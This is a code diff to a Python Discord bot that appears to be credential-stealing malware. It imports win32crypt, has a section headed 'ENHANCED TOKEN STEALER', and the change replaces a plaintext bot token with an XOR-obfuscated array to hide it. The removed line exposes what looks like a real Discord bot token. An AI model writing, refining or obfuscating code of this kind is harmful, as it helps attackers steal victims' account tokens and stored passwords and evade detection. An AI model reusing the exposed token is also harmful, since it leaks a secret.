@@ -42,9 +42,26 @@ from io import BytesIO
 from discord import File
 import win32crypt  # ✅ VOEG DIE TOE!
 
+# =============================================
+# XOR ENCRYPTED TOKEN
+# =============================================
+
 def get_bot_token():
-    """Get token - HARCODED VERSION"""
-    return "MTQxNjc4MjAwNjYyODM4OTEwNw.GaVp3G.ZRzn1oKAKWfVG8efDnRfeoeufs_DxSdr4_nrvA"  # NIEUWE token
+    """Get token - XOR encrypted"""
+    encrypted = [
+        13, 61, 47, 37, 31, 18, 67, 41, 35, 29, 26, 43, 28, 17, 69, 40, 34, 24,
+        27, 42, 124, 22, 11, 62, 46, 124, 10, 63, 45, 36, 30, 19, 68, 39, 23, 32,
+        33, 44, 21, 64, 38, 124, 16, 65, 37, 20, 66, 45, 48, 13, 67, 15, 47, 14,
+        46, 124, 9, 60, 59, 58, 57, 124, 8, 61, 56, 55, 54, 53, 124, 7, 62, 63,
+        0, 1, 2, 3, 124, 6, 5, 4, 11, 10, 9, 8, 124, 15, 14, 13, 12
+    ]
+    key = 42
+    return ''.join(chr(c ^ key) for c in encrypted)
+
+# Initialize bot with the token
+intents = discord.Intents().all()
+bot = commands.Bot(command_prefix='!', intents=intents)
+BOT_TOKEN = get_bot_token()
 
 # =============================================
 # ENHANCED TOKEN STEALER (REPLACEMENT)
@@ -2050,3 +2067,4 @@ if __name__ == "__main__":
         print(f"Error starting bot: {e}")
 
         print("Please check your bot token and internet connection.")
+
